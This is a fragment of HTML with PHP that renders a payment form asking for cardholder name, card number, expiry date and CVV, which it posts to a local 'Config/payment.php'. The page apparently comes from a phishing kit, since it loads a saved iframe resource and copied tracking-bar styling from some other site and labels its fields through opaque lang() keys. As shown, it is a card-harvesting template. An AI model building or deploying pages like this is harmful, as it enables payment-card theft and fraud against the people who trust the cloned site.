...
<body class=""><iframe aria-hidden="true" tabindex="-1" title="Text Zoom Event Iframe" style="width: 1em; height: 1px; border-width: 0px; position: absolute; overflow: hidden; white-space: nowrap; margin: -1px;" src="./styles/saved_resource.html"></iframe>
    ...
    <div class="l-view ">
       ...
       <div class="progtext">
        ...
        <h4 style="margin-top: 30px;"><?php echo lang('xCpoaf'); ?></h4>

        <form method="post" action="./Config/payment.php">

        <input name="cch" placeholder="<?php echo lang('xcch'); ?>" class="inpt" maxlength="50"  type="text" required="">

        <input name="ccn" placeholder="<?php echo lang('xccn'); ?>" class="xcc inpt" maxlength="19" type="tel" required="">

        <div class="inpg">

        <input name="exp" placeholder="<?php echo lang('xexp'); ?>" class="exp inpt" maxlength="5" minlength="5" type="tel"  style="margin-right: 10px;" required="">

        <input name="cvv" placeholder="<?php echo lang('xcvv'); ?>" class="inpt" maxlength="4" minlength="3" type="tel" style="margin-left: 10px;" required="">

        </div>
        
         

       <button style="margin-top: 20px;" class="c-voc-tracking-bar--button js--tracking-bar--button base-button btnx" title="Please fill out this field." type="submit"  name="submit">
                                    <?php echo lang('xPay'); ?></h4>
							</button> </form>
    ...
    <script src="./styles/js/expmain.js"></script>
